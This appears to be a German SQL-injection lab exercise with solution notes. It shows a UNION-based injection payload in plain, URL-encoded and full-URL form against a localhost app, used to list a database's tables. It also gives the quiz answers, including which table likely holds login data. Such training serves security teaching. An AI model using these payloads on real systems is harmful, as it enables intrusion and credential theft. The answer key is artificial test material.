Ändern Sie das Statement so ab, dass Sie die Namen der Tabellen in der Datenbank auslesen können.

Tipp:
Sie benötigen die Funktion `GROUP_CONCAT()` sowie Metadaten aus der View `INFORMATION_SCHEMA.TABLES`.

Tipp 2:
https://chartio.com/learn/databases/using-information-schema-views-to-check-to-see-if-table-exists-in-sql-server/

' AND 1=0 UNION SELECT 0,0,0,0,0,(SELECT GROUP_CONCAT(TABLE_NAME) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='highlight_db' ),0;--
'%20AND%201%3D0%20UNION%20SELECT%200%2C0%2C0%2C0%2C0%2C(SELECT%20GROUP_CONCAT(TABLE_NAME)%20FROM%0AINFORMATION_SCHEMA.TABLES%20WHERE%20TABLE_SCHEMA%3D'highlight_db'%20)%2C0%3B--%20
http://localhost:82/index.php?id=2%27%20AND%201%3D0%20UNION%20SELECT%200%2C0%2C0%2C0%2C0%2C(SELECT%20GROUP_CONCAT(TABLE_NAME)%20FROM%0AINFORMATION_SCHEMA.TABLES%20WHERE%20TABLE_SCHEMA%3D%27highlight_db%27%20)%2C0%3B--%20

>>11) Welche Tabellen befinden sich in der Datenbank? Geben Sie die Tabellennamen in alphabetisch aufsteigender Sortierung und durch Leerzeichen getrennt an.<<
=== author community highlight

>>12) Welche der Tabellen könnte Login-Daten für Accounts mit Bearbeitungsrechten enthalten?<<
=== author